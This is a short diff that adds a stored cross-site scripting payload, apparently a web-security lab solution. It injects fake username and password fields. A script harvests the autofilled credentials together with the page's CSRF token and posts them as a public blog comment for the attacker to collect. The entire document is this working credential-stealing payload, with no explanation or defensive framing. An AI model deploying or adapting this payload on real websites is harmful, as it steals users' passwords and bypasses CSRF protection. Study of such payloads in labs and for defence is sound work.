@@ -1,0 +1,23 @@
+<input type = "text" name="username">
+<input type = "password" name="password" onchange="fetch_pass()">  
+
+<script>
+function fetch_pass(){
+var token = document.getElementsByName('csrf')[0].value;
+var username = document.getElementsByName('username')[0].value;
+var password = document.getElementsByName('password')[0].value;
+var data = new FormData();
+
+data.append('csrf',token);
+data.append('postId',3);
+data.append('comment',`${username}:${password}`);
+data.append('name','abc');
+data.append('email','evil@evil.levi');
+data.append('website','http://dk');
+ 
+ fetch('/post/comment',{
+    method:'POST',
+    mode:'no-cors',
+    body: data
+ });
+}
